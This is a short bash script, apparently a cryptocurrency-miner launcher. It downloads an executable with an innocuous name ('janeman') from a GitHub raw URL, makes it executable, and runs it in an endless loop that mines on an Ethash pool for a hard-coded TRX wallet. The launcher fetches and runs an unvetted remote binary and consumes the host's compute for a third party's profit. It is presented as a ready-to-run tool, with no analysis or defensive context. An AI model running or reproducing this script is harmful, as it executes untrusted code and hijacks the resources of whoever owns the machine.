#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
wget https://github.com/squibex/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
